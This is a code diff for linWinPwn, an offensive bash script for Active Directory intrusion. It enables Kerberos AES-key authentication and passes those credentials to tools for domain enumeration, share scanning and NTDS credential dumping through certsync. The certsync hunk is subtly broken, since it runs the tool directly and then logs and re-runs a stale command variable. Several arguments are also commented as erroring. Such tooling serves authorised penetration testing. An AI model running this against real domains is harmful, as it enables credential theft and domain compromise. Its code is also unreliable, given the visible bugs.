@@ -88,7 +88,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.8.1 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.8.2 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -104,7 +104,7 @@ help_linWinPwn () {
     echo -e "-p                Password (NTLM authentication only) (default: empty)" 
     echo -e "-H                LM:NT (NTLM authentication only) (default: empty)" 
     echo -e "-K                Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)" 
-#    echo -e "-A                AES Key (Kerberos authentication only) (default: empty)" 
+    echo -e "-A                AES Key (Kerberos authentication only) (default: empty)" 
     echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
     echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
     echo -e "-o/--output       Output directory (default: current dir)"
@@ -130,7 +130,7 @@ while test $# -gt 0; do
             -p) password="${2}"; pass_bool=true; shift;; #password
             -H) hash="${2}"; hash_bool=true; shift;; #NTLM hash
             -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
-            #-A) aeskey="${2}"; aeskey_bool=true; shift;; #AES Key (128 or 256 bits)
+            -A) aeskey="${2}"; aeskey_bool=true; shift;; #AES Key (128 or 256 bits)
             -t) dc_ip="${2}"; shift;; #mandatory
             --target) dc_ip="${2}"; shift;; #mandatory
             -M) modules="${2}"; shift;; #comma separated modules to run
@@ -361,7 +361,6 @@ prepare (){
 
         if [ "${kerb_bool}" == true ] ; then
             argument_cme=("-d" "${domain}" "-u" "${user}" "--use-kcache")
-            target_dc=${dc_hostname_list}
             pass_bool=false
             hash_bool=false
             aeskey_bool=false
@@ -380,6 +379,7 @@ prepare (){
         fi
 
         if [ -f "${krb5cc}" ] ; then
+            target_dc=${dc_hostname_list}
             target=${dc_FQDN}
             target_sql=${sql_hostname_list}
             export KRB5CCNAME=$(realpath $krb5cc)
@@ -390,7 +390,7 @@ prepare (){
             argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
             argument_ldeep="-d ${domain} -u ${user} -k"
             argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
-            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass"
+            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
             argument_donpapi="-k -no-pass ${domain}/${user}"
             argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
             argument_finduncshar="-d ${domain} -u ${user} -k --no-pass"
@@ -403,28 +403,25 @@ prepare (){
     fi
 
     #Check if kerberos AES key is used
-    #if [ "${aeskey_bool}" == true ] ; then
-    #    target_dc=${dc_hostname_list}
-    #    target=${dc_FQDN}
-    #    target_sql=${sql_hostname_list}
-    #    argument_cme=("-d" "${domain}" "-u" "${user}" "--aesKey" "${aeskey}")
-    #    cme_kerb="-k"
-    #    argument_imp="-aesKey ${aeskey} ${domain}/${user}"
-    #    argument_bhd="-u ${user}@${domain} -aesKey ${aeskey} -no-pass -p '' --auth-method kerberos"
-    #    argument_certi_py="${domain}/${user} --aes ${aeskey}"
-    #    argument_certipy="-u ${user}@${domain} -aes ${aeskey} -target ${dc_FQDN}"
-    #    argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
-    #    argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
-    #    argument_donpapi="-k -no-pass ${domain}/${user} -aesKey ${aeskey}"
-    #    argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
-    #    argument_finduncshar="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
-    #    kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
-    #    pass_bool=false
-    #    hash_bool=false
-    #    kerb_bool=false
-    #    auth_string="${YELLOW}[i]${NC} Authentication method: AES Kerberos key of ${user}"
-#
-    #fi
+    if [ "${aeskey_bool}" == true ] ; then
+        target_dc=${dc_hostname_list}
+        target=${dc_FQDN}
+        target_sql=${sql_hostname_list}
+        argument_cme=("-d" "${domain}" "-u" "${user}" "--aesKey" "${aeskey}") #errors
+        argument_imp="-aesKey ${aeskey} ${domain}/${user}"
+        argument_bhd="-u ${user}@${domain} -aesKey ${aeskey} --auth-method kerberos" #error, PL created
+        argument_certi_py="${domain}/${user} --aes ${aeskey} -k"
+        argument_certipy="-u ${user}@${domain} -aes ${aeskey} -target ${dc_FQDN}"
+        argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
+        argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k" #error, PL created
+        argument_donpapi="-k -aesKey ${aeskey} ${domain}/${user}"
+        argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k" #error, PL created
+        kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
+        pass_bool=false
+        hash_bool=false
+        kerb_bool=false
+        auth_string="${YELLOW}[i]${NC} Authentication method: AES Kerberos key of ${user}"
+    fi
 
     if [ "${nullsess_bool}" == false ] ; then
         auth_check=$(${crackmapexec} smb ${target} "${argument_cme[@]}" 2>&1| grep "\[-\]\|Traceback" -A 10)
@@ -479,7 +476,7 @@ dns_enum () {
                 mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
                 /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
                 /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
-                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 > ${dc_hostname_list}
+                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 | sed 's/\.$//' > ${dc_hostname_list}
             fi
         else
             echo -e "${YELLOW}[i] DNS dump found ${NC}"
@@ -1424,8 +1421,8 @@ finduncshar_scan () {
         echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
     else
         echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
-        if [ "${hash_bool}" == true ]; then
-            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH ${NC}"
+        if [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH nor authentication using AES key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
             command="${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx"
@@ -1715,7 +1712,7 @@ mssql_enum () {
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
-        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
+        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ] && [ "${aeskey_bool}" == false ]; then
             command="${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u  >> ${sql_hostname_list}"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
             eval $command
@@ -2119,7 +2116,7 @@ certsync_ntds_dump () {
             echo -e "${PURPLE}[-] certsync requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-            command="${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt"
+            ${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost "${kdc}.${dc_domain}" -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
             $command
         fi
